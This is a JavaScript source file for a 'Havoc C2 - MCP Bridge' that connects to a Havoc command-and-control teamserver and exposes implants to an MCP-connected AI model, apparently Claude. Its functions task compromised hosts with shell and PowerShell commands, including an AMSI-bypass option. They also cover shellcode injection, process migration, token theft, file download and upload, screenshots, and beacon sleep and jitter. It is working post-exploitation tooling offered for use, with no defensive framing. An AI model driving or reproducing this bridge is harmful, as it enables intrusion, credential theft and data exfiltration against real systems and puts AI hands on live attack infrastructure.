/**
 * Havoc C2 - MCP Bridge
 * Integrates Havoc Framework with Claude MCP for unified C2 operations
 *
 * Features:
 * - Connects to Havoc teamserver service API
 * - Registers as service client
 * - Exposes Havoc Demons to MCP
 * - Provides process migration, injection, and advanced capabilities
 */

import WebSocket from 'ws';
import crypto from 'crypto';
import EventEmitter from 'events';

class HavocBridge extends EventEmitter {
  constructor(config = {}) {
    super();
    this.config = {
      teamserver: config.teamserver || 'wss://127.0.0.1:40056/service',
      password: config.password || 'havoc-service-password',
      reconnectInterval: config.reconnectInterval || 5000,
      ...config
    };

    this.ws = null;
    this.connected = false;
    this.authenticated = false;
    this.demons = new Map(); // Havoc Demons
    this.pendingResponses = new Map();
    this.responseTimeout = 60000;
  }

  // SHA3-256 hash for authentication
  hashPassword(password) {
    return crypto.createHash('sha3-256').update(password).digest('hex');
  }

  // Connect to Havoc teamserver
  async connect() {
    return new Promise((resolve, reject) => {
      console.log(`[Havoc Bridge] Connecting to ${this.config.teamserver}...`);

      this.ws = new WebSocket(this.config.teamserver, {
        rejectUnauthorized: false  // Accept self-signed certs
      });

      this.ws.on('open', () => {
        console.log('[Havoc Bridge] WebSocket connected, authenticating...');
        this.connected = true;
        this.authenticate();
      });

      this.ws.on('message', (data) => {
        this.handleMessage(JSON.parse(data.toString()));
      });

      this.ws.on('close', () => {
        console.log('[Havoc Bridge] Disconnected from teamserver');
        this.connected = false;
        this.authenticated = false;
        this.scheduleReconnect();
      });

      this.ws.on('error', (err) => {
        console.error('[Havoc Bridge] WebSocket error:', err.message);
        reject(err);
      });

      // Resolve on successful auth
      this.once('authenticated', () => resolve(true));
      this.once('auth_failed', () => reject(new Error('Authentication failed')));
    });
  }

  authenticate() {
    const authMsg = {
      Head: { Type: 'Register' },
      Body: { Password: this.config.password }
    };
    this.ws.send(JSON.stringify(authMsg));
  }

  scheduleReconnect() {
    setTimeout(() => {
      if (!this.connected) {
        this.connect().catch(err => {
          console.error('[Havoc Bridge] Reconnect failed:', err.message);
        });
      }
    }, this.config.reconnectInterval);
  }

  handleMessage(msg) {
    const headType = msg.Head?.Type;
    const bodyType = msg.Body?.Type;

    // Authentication response
    if (headType === 'Register') {
      if (msg.Body?.Success) {
        console.log('[Havoc Bridge] Authenticated successfully');
        this.authenticated = true;
        this.emit('authenticated');
        this.registerMCPAgent();
      } else {
        console.error('[Havoc Bridge] Authentication failed');
        this.emit('auth_failed');
      }
      return;
    }

    // Agent responses
    if (headType === 'Agent') {
      this.handleAgentMessage(msg);
      return;
    }

    // Check for pending responses
    const requestId = msg.Head?.RequestID;
    if (requestId && this.pendingResponses.has(requestId)) {
      const { resolve } = this.pendingResponses.get(requestId);
      this.pendingResponses.delete(requestId);
      resolve(msg);
    }
  }

  handleAgentMessage(msg) {
    const bodyType = msg.Body?.Type;

    switch (bodyType) {
      case 'AgentOutput':
        // Demon callback output
        const agentId = msg.Body.AgentID;
        const callback = msg.Body.Callback;
        console.log(`[Havoc Bridge] Demon ${agentId} output:`, callback);
        this.emit('demon_output', { agentId, callback });
        break;

      case 'AgentRegister':
        // New Demon registered
        const info = msg.Body.RegisterInfo;
        console.log('[Havoc Bridge] New Demon registered:', info);
        this.emit('demon_registered', info);
        break;
    }
  }

  // Register MCP as a service agent type in Havoc
  registerMCPAgent() {
    const agentDef = {
      Head: { Type: 'RegisterAgent' },
      Body: {
        Agent: {
          Name: 'MCP-Agent',
          Description: 'Claude MCP Remote Agent',
          Version: '1.0.0',
          Author: 'Claude C2',
          MagicValue: '0x4D435041', // "MCPA"
          Arch: ['x64', 'x86'],
          Formats: [
            { Name: 'Windows EXE', Extension: 'exe' },
            { Name: 'Windows DLL', Extension: 'dll' },
            { Name: 'PowerShell', Extension: 'ps1' },
            { Name: 'Python', Extension: 'py' }
          ],
          Commands: [
            { Name: 'shell', Description: 'Execute shell command', MitreTechniques: ['T1059'] },
            { Name: 'powershell', Description: 'Execute PowerShell', MitreTechniques: ['T1059.001'] },
            { Name: 'download', Description: 'Download file from target', MitreTechniques: ['T1041'] },
            { Name: 'upload', Description: 'Upload file to target', MitreTechniques: ['T1105'] },
            { Name: 'screenshot', Description: 'Capture screen', MitreTechniques: ['T1113'] },
            { Name: 'migrate', Description: 'Migrate to another process', MitreTechniques: ['T1055'] },
            { Name: 'inject', Description: 'Inject shellcode', MitreTechniques: ['T1055'] }
          ]
        }
      }
    };

    this.send(agentDef);
    console.log('[Havoc Bridge] Registered MCP-Agent with Havoc');
  }

  // Send message to Havoc
  send(msg) {
    if (!this.connected || !this.ws) {
      throw new Error('Not connected to Havoc teamserver');
    }
    this.ws.send(JSON.stringify(msg));
  }

  // Send and wait for response
  async sendAndWait(msg, timeout = this.responseTimeout) {
    const requestId = crypto.randomUUID();
    msg.Head = msg.Head || {};
    msg.Head.RequestID = requestId;

    return new Promise((resolve, reject) => {
      const timer = setTimeout(() => {
        this.pendingResponses.delete(requestId);
        reject(new Error('Response timeout'));
      }, timeout);

      this.pendingResponses.set(requestId, {
        resolve: (response) => {
          clearTimeout(timer);
          resolve(response);
        },
        reject
      });

      this.send(msg);
    });
  }

  // === HAVOC DEMON COMMANDS ===

  // Get list of Havoc Demons
  async getDemons() {
    // This would query the teamserver for demons
    // For now, return from our cache
    return Array.from(this.demons.values());
  }

  // Execute shell command on Demon
  async demonShell(demonId, command) {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'shell',
          Args: command
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Execute PowerShell on Demon
  async demonPowershell(demonId, command, bypassAmsi = false) {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'powershell',
          Args: { cmd: command, bypass_amsi: bypassAmsi }
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Process migration
  async demonMigrate(demonId, targetPid, method = 'CreateRemoteThread') {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'proc::migrate',
          Args: { pid: targetPid, method }
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Process injection
  async demonInject(demonId, targetPid, shellcode, method = 'CreateRemoteThread') {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'proc::inject',
          Args: {
            pid: targetPid,
            shellcode: Buffer.from(shellcode).toString('base64'),
            method
          }
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Spawn and inject
  async demonSpawnInject(demonId, processPath, shellcode) {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'proc::spawn',
          Args: {
            path: processPath,
            shellcode: Buffer.from(shellcode).toString('base64')
          }
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Screenshot
  async demonScreenshot(demonId) {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'screenshot'
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Download file
  async demonDownload(demonId, remotePath) {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'download',
          Args: remotePath
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Upload file
  async demonUpload(demonId, localPath, remotePath, content) {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'upload',
          Args: {
            path: remotePath,
            content: Buffer.from(content).toString('base64')
          }
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Token manipulation
  async demonTokenSteal(demonId, pid) {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'token::steal',
          Args: { pid }
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Sleep configuration
  async demonSleep(demonId, sleepTime, jitter = 0) {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'sleep',
          Args: { time: sleepTime, jitter }
        })).toString('base64')
      }
    };
    return this.sendAndWait(msg);
  }

  // Exit/terminate demon
  async demonExit(demonId) {
    const msg = {
      Head: { Type: 'Agent' },
      Body: {
        Type: 'AgentTask',
        Agent: { NameID: demonId },
        Task: 'Add',
        Command: Buffer.from(JSON.stringify({
          Command: 'exit'
        })).toString('base64')
      }
    };
    return this.send(msg); // No wait, demon exits
  }

  // Close connection
  disconnect() {
    if (this.ws) {
      this.ws.close();
      this.ws = null;
    }
    this.connected = false;
    this.authenticated = false;
  }
}

// Export for use in MCP server
export { HavocBridge };
export default HavocBridge;
